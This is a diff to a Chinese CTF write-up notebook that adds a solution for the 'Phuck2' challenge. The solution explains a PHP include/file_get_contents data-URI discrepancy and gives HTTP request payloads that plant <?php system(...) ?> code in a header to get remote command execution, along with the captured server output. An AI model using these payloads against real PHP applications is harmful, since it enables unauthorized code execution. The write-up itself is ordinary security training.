@@ -21,7 +21,7 @@
 -   [安洵杯 2019]不是文件上传 介乎于签到和中等之间，多个考点重合在一起了
 -   ~~[N1CTF 2018]eating_cms~~
 -   ~~[PASECA2019] honey_shop 读取环境变量，介乎于签到和中等之间~~
--   Phuck2
+-   ~~Phuck2~~
 -   [网鼎杯 2020 总决赛]Game Exp
 
 ### 中等
@@ -908,3 +908,125 @@ buu打开没提示，以为是环境的问题，后面要加上?hl，应该是�
 ?>
 ```
 
+首先在users目录下随机创建了个文件夹，之后进入该文件夹。
+
+判断是否设置HTTP_X_FORWARDED_FOR，否者使用REMOTE_ADDR，之后将\$userFolder中的.和-去除，之后进入\$userFolder的目录。
+
+将\$server的一些环境变量信息写入profile，返回上级目录。
+
+去除page的.和<?和php，之后堆page进行包含，之后删库跑路。
+
+可以本地测试下：
+
+```php
+<?php
+highlight_file(__FILE__);
+chdir('./');
+file_put_contents('profile.txt',print_r($_SERVER,true));
+include("./profile.txt");
+```
+
+考点的内容：
+
+include 与 file_get_contents 在关于 Data URI 处理问题上的问题，include () 与 file_get_contents () 支持Data URI，而且在处理的时候，出现了差异.
+
+先看`file_get_contents`：直接返回`data:,`之后的内容
+
+```php
+<?php
+print(file_get_contents("data:,123/profile"));
+print("\n");
+print(file_get_contents("data:,profile"));
+print("\n");
+#out:
+#123/profile profile
+```
+
+而在` allow_url_include=Off` 的情况下，不允许 include data URI 的，但是如果 `data:,XXX` 是一个目录名的话，可以绕过限制，包含到`/`后边的文件:
+
+```php
+<?php	
+print(include("data:,123/profile"));
+print("\n");
+print(include("data:,profile"));
+print("\n");
+```
+
+---------
+
+当allow_url_include=Off时：
+file_get_contents在处理data:xxx时会直接取xxx
+而include会包含文件名为data:xxx的文件
+
+```php
+file_get_contents('data:,xx/profile');   --> string 'xx/profile'
+include('data:,xx/profile');             --> 'data:,xx/profile'
+```
+
+---------
+
+include的时候可以解析php语句，
+
+payload:
+
+```php
+GET /?page=data:,aa/profile HTTP/1.1
+X-Forwarded-For: data:,aa  #创建名字为data:,xx的文件夹
+ss: <?php system('ls /'); ?>
+    
+GET /?page=data:,aa/profile HTTP/1.1
+X-Forwarded-For: data:,aa
+ss: <?php system('/get_flag'); ?>
+    
+实际上file_get_contents('xx/profile') 不存在xx文件夹，结果为false绕过if判断
+然后include(data:,xx/profile),里面是$_SERVER的内容，其中包含php语句执行的结果
+
+
+```
+
+```
+Array
+(
+    [HTTP_X_FORWARDED_FOR] => data:aa
+    [HTTP_SS] => flag{5acc61fc-d4f7-4748-97e0-b655e4e8fb01}
+    [HTTP_HOST] => node4.buuoj.cn:28170
+    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+    [HTTP_ACCEPT] => text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    [HTTP_ACCEPT_LANGUAGE] => zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    [HTTP_ACCEPT_ENCODING] => gzip, deflate
+    [HTTP_CONNECTION] => close
+    [HTTP_UPGRADE_INSECURE_REQUESTS] => 1
+    [HTTP_CACHE_CONTROL] => max-age=0
+    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    [SERVER_SIGNATURE] => <address>Apache/2.4.18 (Ubuntu) Server at node4.buuoj.cn Port 28170</address>
+
+    [SERVER_SOFTWARE] => Apache/2.4.18 (Ubuntu)
+    [SERVER_NAME] => node4.buuoj.cn
+    [SERVER_ADDR] => 10.244.80.124
+    [SERVER_PORT] => 28170
+    [REMOTE_ADDR] => 10.244.80.46
+    [DOCUMENT_ROOT] => /var/www/html
+    [REQUEST_SCHEME] => http
+    [CONTEXT_PREFIX] => 
+    [CONTEXT_DOCUMENT_ROOT] => /var/www/html
+    [SERVER_ADMIN] => webmaster@localhost
+    [SCRIPT_FILENAME] => /var/www/html/index.php
+    [REMOTE_PORT] => 46206
+    [GATEWAY_INTERFACE] => CGI/1.1
+    [SERVER_PROTOCOL] => HTTP/1.1
+    [REQUEST_METHOD] => GET
+    [QUERY_STRING] => page=data:aa/profile
+    [REQUEST_URI] => /?page=data:aa/profile
+    [SCRIPT_NAME] => /index.php
+    [PHP_SELF] => /index.php
+    [REQUEST_TIME_FLOAT] => 1641744281.579
+    [REQUEST_TIME] => 1641744281
+)
+
+```
+
+
+
+
+
+### [网鼎杯 2020 总决赛]Game Exp
